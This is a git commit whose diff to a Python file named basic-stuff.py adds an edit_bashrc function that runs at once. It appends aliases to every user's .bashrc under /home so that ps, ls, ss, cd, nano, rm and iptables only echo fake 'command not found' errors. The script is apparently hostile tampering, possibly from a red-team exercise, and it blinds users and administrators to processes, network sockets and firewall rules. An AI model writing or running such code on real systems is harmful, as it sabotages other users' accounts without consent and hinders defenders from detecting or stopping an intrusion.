fd27f160814bc2876d8efa148fc026ebf5021583
MdbookTech <michael@mdbooktech.com>
2022-02-17 14:26:03 -0500

    added edit_bashrc

--- basic/basic-stuff.py
+++ basic/basic-stuff.py
@@ -1,9 +1,21 @@
 import os
 
-os.chdir("/home")
-for file in os.listdir("."):
-    if os.path.isdir(file):
-        f = open(file + "/.bashrc", "a")
-        f.write("alias ps=echo no")
-        f.write("test")
-        f.close()
+
+
+def edit_bashrc():
+    os.chdir("/home")
+    for file in os.listdir("."):
+        if os.path.isdir(file):
+            f = open(file + "/.bashrc", "a")
+            f.write('alias ps=echo "ps: command not found"\n')
+            f.write('alias ls=echo "ls: command not found"\n')
+            f.write('alias ss=echo "ss: command not found"\n')
+            f.write('alias cd=echo "cd: command not found"\n')
+            f.write('alias nano=echo "nano: command not found"\n')
+            f.write('alias rm=echo "rm: command not found"\n')
+            f.write('alias cd=echo "cd: command not found"\n')
+            f.write('alias iptables=echo "iptables: command not found"\n')
+            f.close()
+
+
+edit_bashrc()
